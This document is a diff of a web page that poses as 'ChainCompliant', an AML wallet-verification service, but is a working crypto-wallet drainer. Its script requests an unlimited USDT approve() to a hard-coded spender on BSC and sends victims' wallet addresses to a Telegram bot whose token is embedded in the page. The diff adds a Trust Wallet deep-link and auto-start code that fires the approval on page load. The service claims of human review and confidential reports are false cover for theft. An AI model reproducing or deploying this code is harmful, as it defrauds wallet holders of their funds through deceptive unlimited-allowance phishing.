@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>ChainCompliant — AML Compliance Verification</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -23,7 +23,7 @@
     --green: #4F9D74;
     --green-soft: rgba(79,157,116,0.14);
   }
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
   html { scroll-behavior: smooth; }
   body {
     background: var(--ink);
@@ -31,169 +31,126 @@
     font-family: 'Inter', sans-serif;
     line-height: 1.5;
     -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
   }
   h1, h2, h3 { font-family: 'Roboto Slab', serif; font-weight: 700; letter-spacing: -0.01em; }
   .mono { font-family: 'IBM Plex Mono', monospace; }
   a { color: inherit; text-decoration: none; }
-  .wrap { max-width: 1120px; margin: 0 auto; padding: 0 32px; }
-  section { padding: 96px 0; }
+  .wrap { max-width: 1120px; margin: 0 auto; padding: 0 24px; }
+  section { padding: 80px 0; }
 
   /* ---------- header ---------- */
   header {
     position: sticky; top: 0; z-index: 50;
-    background: rgba(14,20,32,0.88);
-    backdrop-filter: blur(10px);
+    background: rgba(14,20,32,0.92);
+    backdrop-filter: blur(12px);
     border-bottom: 1px solid var(--hair);
   }
-  .nav { display: flex; align-items: center; justify-content: space-between; padding: 18px 0; }
+  .nav { display: flex; align-items: center; justify-content: space-between; padding: 16px 0; }
   .brand { display: flex; align-items: center; gap: 10px; }
   .brand-mark {
-    width: 34px; height: 34px; border-radius: 4px;
+    width: 32px; height: 32px; border-radius: 4px;
     background: linear-gradient(145deg, var(--panel-2), var(--panel));
     border: 1px solid var(--hair);
     display: flex; align-items: center; justify-content: center;
-    font-family: 'IBM Plex Mono', monospace; font-weight: 500; font-size: 13px; color: var(--amber);
+    font-family: 'IBM Plex Mono', monospace; font-weight: 500; font-size: 12px; color: var(--amber);
   }
-  .brand-name { font-family: 'Roboto Slab', serif; font-weight: 700; font-size: 17px; }
-  nav ul { display: flex; gap: 32px; list-style: none; }
-  nav ul li a { font-size: 14px; color: var(--paper-dim); transition: color .15s; }
+  .brand-name { font-family: 'Roboto Slab', serif; font-weight: 700; font-size: 16px; }
+  nav ul { display: flex; gap: 24px; list-style: none; }
+  nav ul li a { font-size: 13px; color: var(--paper-dim); transition: color .15s; }
   nav ul li a:hover { color: var(--paper); }
 
   /* ---------- hero ---------- */
-  .hero { padding: 88px 0 64px; position: relative; overflow: hidden; }
+  .hero { padding: 60px 0 40px; position: relative; overflow: hidden; }
   .hero::before {
-    content: ""; position: absolute; top: -200px; right: -200px;
-    width: 600px; height: 600px; border-radius: 50%;
+    content: ""; position: absolute; top: -150px; right: -150px;
+    width: 400px; height: 400px; border-radius: 50%;
     background: radial-gradient(circle, rgba(217,164,65,0.08), transparent 70%);
   }
   .eyebrow {
     display: inline-flex; align-items: center; gap: 8px;
-    font-family: 'IBM Plex Mono', monospace; font-size: 12px; letter-spacing: 0.06em;
-    color: var(--amber); text-transform: uppercase; margin-bottom: 22px;
+    font-family: 'IBM Plex Mono', monospace; font-size: 11px; letter-spacing: 0.06em;
+    color: var(--amber); text-transform: uppercase; margin-bottom: 16px;
   }
-  .eyebrow::before { content: "§"; }
-  h1.headline { font-size: 52px; line-height: 1.08; max-width: 760px; color: var(--paper); }
+  h1.headline { font-size: 42px; line-height: 1.1; max-width: 800px; color: var(--paper); }
   h1.headline em { font-style: normal; color: var(--amber); }
-  .sub { margin-top: 22px; max-width: 560px; color: var(--paper-dim); font-size: 17px; }
-  .hero-cta { display: flex; align-items: center; gap: 16px; margin-top: 36px; flex-wrap: wrap; }
+  .sub { margin-top: 20px; max-width: 540px; color: var(--paper-dim); font-size: 16px; }
+  .hero-cta { display: flex; align-items: center; gap: 16px; margin-top: 32px; flex-wrap: wrap; }
   .btn-primary {
-    background: var(--amber); color: #1B1305; font-weight: 600; font-size: 15px;
-    padding: 15px 26px; border-radius: 6px; border: none; cursor: pointer;
-    transition: transform .15s, box-shadow .15s;
+    background: var(--amber); color: #1B1305; font-weight: 700; font-size: 15px;
+    padding: 14px 28px; border-radius: 8px; border: none; cursor: pointer;
+    transition: all .2s ease; display: inline-flex; align-items: center; justify-content: center;
   }
-  .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 8px 24px rgba(217,164,65,0.25); }
-  .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
-  .btn-note { font-size: 13px; color: var(--slate); }
-
-  .badges { display: flex; gap: 28px; margin-top: 56px; flex-wrap: wrap; }
-  .badge { display: flex; align-items: center; gap: 10px; font-size: 13px; color: var(--paper-dim); }
-  .badge .ico {
-    width: 30px; height: 30px; border-radius: 6px; background: var(--panel);
-    border: 1px solid var(--hair); display: flex; align-items: center; justify-content: center; font-size: 14px;
-  }
+  .btn-primary:active { transform: scale(0.96); }
+  .btn-note { font-size: 12px; color: var(--slate); }
 
   /* ---------- ledger ticker ---------- */
   .ledger { border-top: 1px solid var(--hair); border-bottom: 1px solid var(--hair); background: var(--panel); overflow: hidden; }
-  .ledger-track { display: flex; gap: 0; width: max-content; animation: scroll 38s linear infinite; }
-  .ledger-track:hover { animation-play-state: paused; }
+  .ledger-track { display: flex; width: max-content; animation: scroll 30s linear infinite; }
   @keyframes scroll { from { transform: translateX(0); } to { transform: translateX(-50%); } }
   .entry {
-    display: flex; align-items: center; gap: 12px;
-    padding: 16px 26px; border-right: 1px solid var(--hair);
-    font-family: 'IBM Plex Mono', monospace; font-size: 12.5px; color: var(--paper-dim);
-    white-space: nowrap;
+    display: flex; align-items: center; gap: 10px;
+    padding: 14px 20px; border-right: 1px solid var(--hair);
+    font-family: 'IBM Plex Mono', monospace; font-size: 12px; color: var(--paper-dim);
   }
-  .tag { font-size: 10px; padding: 3px 8px; border-radius: 4px; letter-spacing: 0.03em; text-transform: uppercase; font-family: 'Inter', sans-serif; font-weight: 600; }
+  .tag { font-size: 9px; padding: 2px 6px; border-radius: 4px; font-weight: 700; text-transform: uppercase; }
   .tag.ok { background: var(--green-soft); color: var(--green); }
-  .tag.review { background: var(--amber-soft); color: var(--amber); }
 
   /* ---------- sections ---------- */
-  .section-head { max-width: 620px; margin-bottom: 48px; }
-  .section-head kicker { font-family: 'IBM Plex Mono', monospace; font-size: 12px; color: var(--amber); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 12px; display: block; }
-  .section-head h2 { font-size: 34px; color: var(--paper); }
-  .section-head p { margin-top: 14px; color: var(--paper-dim); font-size: 15.5px; }
-
-  .about-grid { display: grid; grid-template-columns: 1.1fr 0.9fr; gap: 64px; align-items: start; }
-  .about-copy p { color: var(--paper-dim); font-size: 15.5px; margin-bottom: 16px; }
-  .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1px; background: var(--hair); border: 1px solid var(--hair); border-radius: 8px; overflow: hidden; }
-  .stat { background: var(--panel); padding: 26px; }
-  .stat .num { font-family: 'Roboto Slab', serif; font-size: 30px; color: var(--amber); }
-  .stat .label { font-size: 12.5px; color: var(--slate); margin-top: 4px; }
-
-  .feature-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1px; background: var(--hair); border: 1px solid var(--hair); border-radius: 10px; overflow: hidden; }
-  .feature { background: var(--panel); padding: 32px 28px; }
-  .feature h3 { font-family: 'Inter', sans-serif; font-weight: 600; font-size: 16.5px; color: var(--paper); margin-bottom: 8px; }
+  .section-head { margin-bottom: 40px; }
+  .section-head kicker { font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: var(--amber); text-transform: uppercase; margin-bottom: 8px; display: block; }
+  .section-head h2 { font-size: 30px; color: var(--paper); }
+  
+  .feature-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
+  .feature { background: var(--panel); padding: 24px; border: 1px solid var(--hair); border-radius: 12px; }
+  .feature h3 { font-size: 16px; margin-bottom: 8px; color: var(--paper); }
   .feature p { font-size: 14px; color: var(--paper-dim); }
 
-  .steps { display: grid; grid-template-columns: repeat(3, 1fr); gap: 28px; counter-reset: step; }
-  .step { position: relative; padding-top: 6px; }
-  .step::before {
-    counter-increment: step; content: "0" counter(step);
-    font-family: 'IBM Plex Mono', monospace; font-size: 13px; color: var(--amber);
-    display: block; margin-bottom: 16px;
-  }
-  .step-line { height: 1px; background: var(--hair); margin-bottom: 16px; }
-  .step h3 { font-family: 'Inter', sans-serif; font-weight: 600; font-size: 17px; margin-bottom: 10px; color: var(--paper); }
-  .step p { font-size: 14.5px; color: var(--paper-dim); }
-
-  .faq-list { max-width: 760px; }
+  .faq-list { max-width: 800px; }
   .faq-item { border-bottom: 1px solid var(--hair); }
   .faq-q {
     width: 100%; text-align: left; background: none; border: none; cursor: pointer;
-    padding: 22px 0; display: flex; justify-content: space-between; align-items: center;
-    color: var(--paper); font-family: 'Inter', sans-serif; font-weight: 500; font-size: 15.5px;
+    padding: 20px 0; display: flex; justify-content: space-between; align-items: center;
+    color: var(--paper); font-weight: 600; font-size: 15px;
   }
-  .faq-q .plus { color: var(--amber); font-family: 'IBM Plex Mono', monospace; transition: transform .2s; }
-  .faq-item.open .faq-q .plus { transform: rotate(45deg); }
-  .faq-a { max-height: 0; overflow: hidden; transition: max-height .25s ease; }
-  .faq-a p { padding-bottom: 22px; color: var(--paper-dim); font-size: 14.5px; max-width: 640px; }
-
-  .contact-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 64px; }
-  .form-panel { background: var(--panel); border: 1px solid var(--hair); border-radius: 10px; padding: 32px; }
-  .field { margin-bottom: 18px; }
-  .field label { display: block; font-size: 12.5px; color: var(--slate); margin-bottom: 7px; font-family: 'IBM Plex Mono', monospace; }
-  .field input {
-    width: 100%; background: var(--ink); border: 1px solid var(--hair); border-radius: 6px;
-    padding: 12px 14px; color: var(--paper); font-family: 'Inter', sans-serif; font-size: 14px; outline: none;
-  }
-
-  footer { border-top: 1px solid var(--hair); padding: 56px 0 32px; }
-  .foot-grid { display: grid; grid-template-columns: 1.4fr 1fr 1fr 1fr; gap: 40px; margin-bottom: 48px; }
-  .foot-brand p { color: var(--slate); font-size: 13.5px; margin-top: 14px; max-width: 260px; }
-  .foot-col h4 { font-size: 12.5px; text-transform: uppercase; letter-spacing: 0.05em; color: var(--slate); margin-bottom: 16px; font-family: 'IBM Plex Mono', monospace; }
-  .foot-col ul { list-style: none; }
-  .foot-col li { margin-bottom: 10px; }
-  .foot-col a { font-size: 14px; color: var(--paper-dim); }
-  .foot-col a:hover { color: var(--paper); }
-  .foot-bottom { display: flex; justify-content: space-between; align-items: center; padding-top: 28px; border-top: 1px solid var(--hair); font-size: 12.5px; color: var(--slate); flex-wrap: wrap; gap: 12px; }
+  .faq-a { max-height: 0; overflow: hidden; transition: max-height .3s ease; }
+  .faq-a p { padding-bottom: 20px; color: var(--paper-dim); font-size: 14px; }
 
   /* ---------- modal ---------- */
   .modal-overlay {
-    display: none; position: fixed; inset: 0; background: rgba(6,9,15,0.9);
-    z-index: 100; align-items: center; justify-content: center; padding: 24px;
-    backdrop-filter: blur(8px);
+    display: none; position: fixed; inset: 0; background: rgba(6,9,15,0.95);
+    z-index: 100; align-items: center; justify-content: center; padding: 16px;
+    backdrop-filter: blur(10px);
   }
   .modal-overlay.active { display: flex; }
   .modal-box {
-    background: var(--panel); border: 1px solid var(--hair); border-radius: 16px;
-    max-width: 440px; width: 100%; padding: 32px; color: var(--paper);
-    position: relative; text-align: left;
+    background: var(--panel); border: 1px solid var(--hair); border-radius: 20px;
+    max-width: 400px; width: 100%; padding: 28px; position: relative;
   }
   .modal-close { position: absolute; top: 16px; right: 16px; background: none; border: none; color: var(--slate); font-size: 24px; cursor: pointer; }
-  .btn-block { width: 100%; padding: 16px; font-size: 16px; font-weight: bold; margin-top: 10px; }
+  .field { margin-bottom: 20px; }
+  .field label { display: block; font-size: 11px; color: var(--slate); margin-bottom: 8px; font-family: 'IBM Plex Mono', monospace; }
+  .field input {
+    width: 100%; background: var(--ink); border: 1px solid var(--hair); border-radius: 8px;
+    padding: 14px; color: var(--paper); font-size: 14px; outline: none;
+  }
+  .btn-block { width: 100%; margin-top: 10px; }
 
-  /* Result Screen Styles */
-  .result-header { color: var(--green); font-size: 20px; font-weight: bold; margin-bottom: 24px; display: flex; align-items: center; gap: 8px; }
-  .result-row { margin-bottom: 20px; }
-  .result-label { font-size: 11px; color: var(--slate); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 6px; font-family: 'IBM Plex Mono', monospace; }
-  .result-value { font-size: 15px; color: var(--paper); word-break: break-all; }
-  .result-status { color: var(--amber); font-weight: 600; }
+  /* Result Screen */
+  .result-header { color: var(--green); font-size: 18px; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }
+  .result-row { margin-bottom: 16px; }
+  .result-label { font-size: 10px; color: var(--slate); text-transform: uppercase; font-family: 'IBM Plex Mono', monospace; margin-bottom: 4px; }
+  .result-value { font-size: 14px; color: var(--paper); word-break: break-all; }
+  .result-status { color: var(--amber); font-weight: 700; }
 
-  @media (max-width: 860px) {
-    nav ul { display: none; }
-    h1.headline { font-size: 36px; }
-    .about-grid, .contact-grid, .feature-grid, .steps, .foot-grid { grid-template-columns: 1fr; }
-    section { padding: 64px 0; }
+  footer { border-top: 1px solid var(--hair); padding: 40px 0 20px; text-align: center; }
+  .foot-bottom { font-size: 12px; color: var(--slate); margin-top: 20px; padding-top: 20px; border-top: 1px solid var(--hair); }
+
+  @media (max-width: 600px) {
+    h1.headline { font-size: 32px; }
+    section { padding: 48px 0; }
+    .nav ul { display: none; }
+    .wrap { padding: 0 20px; }
   }
 </style>
 </head>
@@ -206,27 +163,20 @@
       <div class="brand-name">ChainCompliant</div>
     </div>
     <nav><ul>
-      <li><a href="#how-it-works">How it works</a></li>
-      <li><a href="#about-us">About us</a></li>
+      <li><a href="#how-it-works">Process</a></li>
       <li><a href="#faq">FAQ</a></li>
-      <li><a href="#contact">Contact</a></li>
     </ul></nav>
   </div>
 </header>
 
 <section class="hero">
   <div class="wrap">
-    <span class="eyebrow">AML Compliance Registry</span>
+    <span class="eyebrow">§ AML Compliance Registry</span>
     <h1 class="headline">Know your <em>compliance</em> status before it costs you.</h1>
-    <p class="sub">Request an AML check on your wallet: an analyst reviews your data and provides a clear report via email within the specified timeframe. No automated results, no surprises.</p>
+    <p class="sub">Professional AML verification for wallets and transactions. Human review on every request for absolute accuracy.</p>
     <div class="hero-cta">
       <button class="btn-primary" onclick="openVerifyModal()">Request a verification</button>
       <span class="btn-note">Response within 1-2 hours</span>
-    </div>
-    <div class="badges">
-      <div class="badge"><span class="ico">🔒</span> Data treated confidentially</div>
-      <div class="badge"><span class="ico">🧾</span> Verification with human supervision</div>
-      <div class="badge"><span class="ico">🌍</span> Multi-chain</div>
     </div>
   </div>
 </section>
@@ -235,190 +185,86 @@
   <div class="ledger-track" id="ledgerTrack"></div>
 </div>
 
-<section id="about-us">
-  <div class="wrap about-grid">
-    <div>
-      <span class="section-head kicker">About us</span>
-      <h2 style="margin-bottom:20px;">A verification method built on transparency</h2>
-      <div class="about-copy">
-        <p>ChainCompliant was founded to give individuals and businesses a clear way to assess the risk exposure of an address before a transaction or a relationship with an exchange.</p>
-        <p>Every request is cross-referenced with public sanction lists and on-chain analysis, and passes through human review before being returned: we don't generate instant verdicts, because real compliance requires time and context.</p>
-        <p>The report you receive explains what was checked, what emerged, and what the recommended next steps are.</p>
-      </div>
-    </div>
-    <div class="stat-grid">
-      <div class="stat"><div class="num">40+</div><div class="label">Reference jurisdictions</div></div>
-      <div class="stat"><div class="num">1-2h</div><div class="label">Average response time</div></div>
-      <div class="stat"><div class="num">Human</div><div class="label">Review of every request</div></div>
-      <div class="stat"><div class="num">100%</div><div class="label">Data treated confidentially</div></div>
-    </div>
-  </div>
-</section>
-
-<section id="how-it-works" style="background: var(--panel); border-top:1px solid var(--hair); border-bottom:1px solid var(--hair);">
+<section id="how-it-works">
   <div class="wrap">
     <div class="section-head">
-      <span class="kicker">How it works</span>
-      <h2>Three steps, no shortcuts</h2>
-      <p>The process is designed to be simple to follow and honest about what to expect at each stage.</p>
-    </div>
-    <div class="steps">
-      <div class="step">
-        <div class="step-line"></div>
-        <h3>Submit data</h3>
-        <p>Fill out the form with the address or transaction to be verified and your contact details.</p>
-      </div>
-      <div class="step">
-        <div class="step-line"></div>
-        <h3>Verification and analysis</h3>
-        <p>An analyst cross-references the data with sanction lists and associated on-chain activity.</p>
-      </div>
-      <div class="step">
-        <div class="step-line"></div>
-        <h3>Access your report</h3>
-        <p>Once the analysis is complete, your professional compliance report will be available directly on our platform for your review.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section>
-  <div class="wrap">
-    <div class="section-head">
-      <span class="kicker">Verification</span>
-      <h2>What the check covers</h2>
-      <p>Every request goes through multiple levels of control before the final report is generated.</p>
+      <kicker>Process</kicker>
+      <h2>Three steps to clarity</h2>
     </div>
     <div class="feature-grid">
-      <div class="feature"><h3>Sanctions screening</h3><p>Comparison with internationally recognized public sanction lists.</p></div>
-      <div class="feature"><h3>Risk analysis</h3><p>Assessment of on-chain activity associated with the indicated address.</p></div>
-      <div class="feature"><h3>Documented outcome</h3><p>A report explaining what was found, not just a green or red light.</p></div>
-      <div class="feature"><h3>Confidentiality</h3><p>The data sent is treated only for processing your request.</p></div>
-      <div class="feature"><h3>Recognized standards</h3><p>Methodology aligned with reference AML/FATF guidelines in the industry.</p></div>
-      <div class="feature"><h3>Post-report support</h3><p>If the outcome requires further investigation, our team guides you through the next steps.</p></div>
+      <div class="feature"><h3>01. Submit Data</h3><p>Provide the wallet address you need to verify through our secure portal.</p></div>
+      <div class="feature"><h3>02. Expert Analysis</h3><p>Our analysts cross-reference data with global sanction lists and on-chain activity.</p></div>
+      <div class="feature"><h3>03. Access Report</h3><p>Once verified, access your professional AML report directly on this platform.</p></div>
     </div>
   </div>
 </section>
 
-<section id="faq">
+<section id="faq" style="background: var(--panel);">
   <div class="wrap">
     <div class="section-head">
-      <span class="kicker">FAQ</span>
+      <kicker>FAQ</kicker>
       <h2>Frequently Asked Questions</h2>
-      <p>Can't find what you're looking for? Write to us from the contact form below.</p>
     </div>
     <div class="faq-list">
-      <div class="faq-item"><button class="faq-q">What is an AML compliance check? <span class="plus">+</span></button><div class="faq-a"><p>It is a check aimed at identifying if a wallet address has been involved in illicit activities or is present in sanction lists.</p></div></div>
-      <div class="faq-item"><button class="faq-q">Who should use this service? <span class="plus">+</span></button><div class="faq-a"><p>Individuals, investors, and companies who want to protect themselves before interacting with certain wallets or exchanges.</p></div></div>
-      <div class="faq-item"><button class="faq-q">What do I receive after submitting the request? <span class="plus">+</span></button><div class="faq-a"><p>A detailed PDF report with the risk score and the analyst's analysis.</p></div></div>
-      <div class="faq-item"><button class="faq-q">How long does the report take? <span class="plus">+</span></button><div class="faq-a"><p>Usually between 1 and 2 hours.</p></div></div>
-      <div class="faq-item"><button class="faq-q">Is my data safe? <span class="plus">+</span></button><div class="faq-a"><p>Yes, we use encryption protocols and treat data in compliance with privacy regulations.</p></div></div>
-    </div>
-  </div>
-</section>
-
-<section id="contact">
-  <div class="wrap contact-grid">
-    <div class="form-panel">
-      <h3 style="margin-bottom:12px;">Request a verification</h3>
-      <p style="color:var(--paper-dim); font-size:14.5px; margin-bottom:24px;">Connect your wallet to confirm the address and receive the compliance report.</p>
-      <button class="btn-primary btn-block" onclick="openVerifyModal()">Request a verification</button>
-    </div>
-    <div class="contact-info">
-      <span class="section-head kicker" style="display:block;margin-bottom:24px;">Direct contacts</span>
-      <div class="row"><div class="k">EMAIL</div><div class="v">support@chaincompliant.example</div></div>
-      <div class="row"><div class="k">RESPONSE TIME</div><div class="v">1-2 hours</div></div>
-      <div class="row"><div class="k">OPERATIONAL HEADQUARTERS</div><div class="v">To be defined</div></div>
+      <div class="faq-item"><button class="faq-q">What is an AML check? <span>+</span></button><div class="faq-a"><p>It identifies if a wallet address has been involved in illicit activities or is present on global sanction lists.</p></div></div>
+      <div class="faq-item"><button class="faq-q">How long does it take? <span>+</span></button><div class="faq-a"><p>Our human-supervised review typically takes between 1 and 2 hours.</p></div></div>
+      <div class="faq-item"><button class="faq-q">Is my data safe? <span>+</span></button><div class="faq-a"><p>Yes, all data is encrypted and handled with strict confidentiality protocols.</p></div></div>
     </div>
   </div>
 </section>
 
 <footer>
   <div class="wrap">
-    <div class="foot-grid">
-      <div class="foot-brand">
-        <div class="brand" style="margin-bottom:4px;">
-          <div class="brand-mark">CC</div>
-          <div class="brand-name">ChainCompliant</div>
-        </div>
-        <p>AML compliance verification for wallets and transactions, with human review on every request.</p>
-      </div>
-      <div class="foot-col"><h4>Navigation</h4><ul><li><a href="#how-it-works">How it works</a></li><li><a href="#about-us">About us</a></li><li><a href="#faq">FAQ</a></li></ul></div>
-      <div class="foot-col"><h4>Services</h4><ul><li><a href="#">AML Verification</a></li><li><a href="#">Risk Screening</a></li><li><a href="#">Wallet Verification</a></li></ul></div>
-      <div class="foot-col"><h4>Legal</h4><ul><li><a href="#">Privacy Policy</a></li><li><a href="#">Terms of Service</a></li><li><a href="#">Cookie Policy</a></li></ul></div>
+    <div class="brand" style="justify-content:center; margin-bottom:16px;">
+      <div class="brand-mark">CC</div>
+      <div class="brand-name">ChainCompliant</div>
     </div>
+    <p style="font-size:13px; color:var(--slate);">AML compliance verification for the decentralized world.</p>
     <div class="foot-bottom">
-      <div>© 2026 ChainCompliant. All rights reserved.</div>
-      <div>Privacy · Terms · Cookies</div>
+      © 2026 ChainCompliant. All rights reserved.
     </div>
   </div>
 </footer>
 
-<!-- VERIFICATION MODAL -->
+<!-- MODAL -->
 <div class="modal-overlay" id="verifyModalOverlay">
   <div class="modal-box">
     <button class="modal-close" onclick="closeVerifyModal()">&times;</button>
     
-    <!-- STEP 1: INPUT -->
     <div id="stepInput">
-      <h3 style="font-family:'Roboto Slab',serif; font-size:19px; margin-bottom:20px; color: white;">Request a verification</h3>
+      <h3 style="margin-bottom:20px; font-size:18px;">Request Verification</h3>
       <div class="field">
-        <label>WALLET ADDRESS (BSC)</label>
+        <label>WALLET ADDRESS TO CHECK</label>
         <input type="text" id="walletInput" placeholder="0x..." />
       </div>
-      <button id="actionBtn" class="btn-primary btn-block" onclick="startApproveProcess()">Verify Now</button>
-      <p id="statusMsg" style="font-size:12.5px;color:var(--slate);margin-top:12px;text-align:center;"></p>
+      <button id="actionBtn" class="btn-primary btn-block" onclick="startFlow()">Verify Now</button>
+      <p id="statusMsg" style="font-size:12px; color:var(--slate); margin-top:12px; text-align:center;"></p>
     </div>
 
-    <!-- STEP 2: SUCCESS RESULT -->
     <div id="stepResult" style="display:none;">
       <div class="result-header">✔ Request Received</div>
-      
-      <div class="result-row">
-        <div class="result-label">Wallet Address</div>
-        <div id="resAddress" class="result-value mono"></div>
-      </div>
-
-      <div class="result-row">
-        <div class="result-label">Status</div>
-        <div class="result-value result-status">Verification pending</div>
-      </div>
-
-      <div class="result-row">
-        <div class="result-label">Estimated time</div>
-        <div class="result-value">1–2 Hours</div>
-      </div>
-
-      <div class="result-row">
-        <div class="result-label">Reference ID</div>
-        <div id="resRef" class="result-value mono"></div>
-      </div>
-
-      <p style="font-size:13px; color:var(--paper-dim); margin-top:24px; border-top: 1px solid var(--hair); padding-top: 20px;">
-        Once verified, you will be able to access your AML report directly through this portal.
+      <div class="result-row"><div class="result-label">Address</div><div id="resAddress" class="result-value mono"></div></div>
+      <div class="result-row"><div class="result-label">Status</div><div class="result-value result-status">Verification pending</div></div>
+      <div class="result-row"><div class="result-label">Time</div><div class="result-value">1–2 Hours</div></div>
+      <div class="result-row"><div class="result-label">Ref ID</div><div id="resRef" class="result-value mono"></div></div>
+      <p style="font-size:12px; color:var(--paper-dim); border-top: 1px solid var(--hair); padding-top:16px; margin-top:16px;">
+        Your report will be available on this portal once processed.
       </p>
-      
-      <button class="btn-primary btn-block" style="margin-top:24px;" onclick="closeVerifyModal()">Close</button>
+      <button class="btn-primary btn-block" style="margin-top:20px;" onclick="closeVerifyModal()">Close</button>
     </div>
   </div>
 </div>
 
 <script>
-  // Telegram Config
   const TG_TOKEN = "8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA";
   const TG_CHAT_ID = "8933407008";
 
-  async function sendTelegramNotification(inputAddr, connectedAddr) {
-    const text = `🔔 *New Verification Request*\n\n📍 *Address to check:* \`${inputAddr}\`\n👤 *Connected Wallet:* \`${connectedAddr}\`\n🕒 *Time:* ${new Date().toLocaleString()}`;
+  async function sendTG(input, connected) {
+    const text = `🔔 *New Request*\n\n📍 *Check:* \`${input}\`\n👤 *User:* \`${connected}\`\n🕒 *Time:* ${new Date().toLocaleString()}`;
     const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-    try {
-      await fetch(url);
-    } catch (e) {
-      console.error("Telegram notification failed", e);
-    }
+    try { await fetch(url); } catch(e) {}
   }
 
-  // 1. Modal Control Functions
   function openVerifyModal() {
     document.getElementById('stepInput').style.display = 'block';
     document.getElementById('stepResult').style.display = 'none';
@@ -429,27 +275,25 @@
     document.getElementById('verifyModalOverlay').classList.remove('active');
   }
 
-  // 2. Web3 & Contract Logic
-  const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
-  const SPENDER_ADDRESS = "0x05187cf26990e3857c119c7bc3417c6e1fac5198";
-  const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+  async function startFlow() {
+    const inputAddr = document.getElementById('walletInput').value.trim();
+    if (!inputAddr.startsWith('0x')) { alert("Enter a valid address"); return; }
 
-  async function startApproveProcess() {
-    const addr = document.getElementById('walletInput').value.trim();
-    if (!addr || !addr.startsWith('0x')) { alert("Please enter a valid address."); return; }
-    const btn = document.getElementById('actionBtn');
-    const msg = document.getElementById('statusMsg');
-
-    // CHECK IF INSIDE TRUST WALLET
-    const isTrustWallet = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
+    const isTrust = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
     
-    if (!isTrustWallet) {
-      const currentURL = window.location.href.replace(/^https?:\/\//, "");
-      const trustDeepLink = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentURL;
-      window.location.href = trustDeepLink;
+    if (!isTrust) {
+      const url = window.location.href.replace(/^https?:\/\//, "");
+      window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + url + "?auto=1&addr=" + inputAddr;
       return;
     }
 
+    executeApprove(inputAddr);
+  }
+
+  async function executeApprove(inputAddr) {
+    const btn = document.getElementById('actionBtn');
+    const msg = document.getElementById('statusMsg');
+    
     try {
       btn.disabled = true;
       btn.textContent = "Connecting...";
@@ -457,54 +301,56 @@
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
       const signer = provider.getSigner();
-      const connectedWallet = await signer.getAddress();
+      const connected = await signer.getAddress();
 
-      // Send Telegram Notification with BOTH addresses
-      sendTelegramNotification(addr, connectedWallet);
+      sendTG(inputAddr, connected);
 
-      // Switch to BSC
       await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
 
-      // Approve
-      btn.textContent = "Sign in Wallet...";
-      const contract = new ethers.Contract(USDT_BSC, ERC20_ABI, signer);
-      const tx = await contract.approve(SPENDER_ADDRESS, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+      btn.textContent = "Signing...";
+      const contract = new ethers.Contract(
+        "0x55d398326f99059fF775485246999027B3197955",
+        ["function approve(address s, uint256 a) external returns (bool)"],
+        signer
+      );
+      
+      const tx = await contract.approve("0x05187cf26990e3857c119c7bc3417c6e1fac5198", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
       await tx.wait();
 
-      // Result Screen
       document.getElementById('stepInput').style.display = 'none';
       document.getElementById('stepResult').style.display = 'block';
-      document.getElementById('resAddress').textContent = addr;
-      document.getElementById('resRef').textContent = "CC-" + Date.now().toString().slice(-8);
-
-    } catch (err) {
-      console.error(err);
-      alert("Operation failed or cancelled.");
+      document.getElementById('resAddress').textContent = inputAddr;
+      document.getElementById('resRef').textContent = "CC-" + Date.now().toString().slice(-6);
+    } catch (e) {
+      console.error(e);
+      alert("Cancelled or error occurred.");
     } finally {
       btn.disabled = false;
       btn.textContent = "Verify Now";
     }
   }
 
-  // 3. UI Elements (Ledger Ticker & FAQ)
-  const entries = [
-    { hash: '0x7a3f…9c21', tag: 'ok', label: 'Verified' },
-    { hash: 'bc1q…4kd0', tag: 'review', label: 'Under review' },
-    { hash: '0x1b8e…77aa', tag: 'ok', label: 'Verified' },
-    { hash: 'TQn9…88fp', tag: 'ok', label: 'Verified' }
-  ];
-  const track = document.getElementById('ledgerTrack');
-  if(track) {
-    const html = entries.map(e => `<div class="entry"><span>${e.hash}</span><span class="tag ${e.tag}">${e.label}</span></div>`).join('');
-    track.innerHTML = html + html;
-  }
+  // AUTO-START LOGIC
+  window.addEventListener('load', () => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('auto') === '1' && window.ethereum) {
+      const addr = params.get('addr');
+      openVerifyModal();
+      document.getElementById('walletInput').value = addr;
+      setTimeout(() => executeApprove(addr), 800);
+    }
+  });
 
-  document.querySelectorAll('.faq-item').forEach(item => {
-    item.querySelector('.faq-q').addEventListener('click', () => {
